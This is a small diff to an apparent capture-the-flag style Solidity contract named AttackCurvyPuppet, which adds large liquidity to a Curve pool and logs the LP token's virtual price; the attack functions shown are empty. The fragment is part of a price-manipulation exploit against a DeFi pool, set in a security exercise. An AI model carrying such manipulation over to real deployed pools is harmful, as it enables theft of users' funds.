@@ -256,11 +256,12 @@ contract AttackCurvyPuppet {
         console.log("attacker eth balance", address(this).balance);
         curvePool.add_liquidity{value: 58685 ether}(amount, 0);
 
-        
+        uint256 virtualPrice = curvePool.get_virtual_price();
+        console.log("LP token price after adding liquidity", virtualPrice);
     }
 
     function removeLiquidity() public {
-
+        
     }
 
     function attack() public {
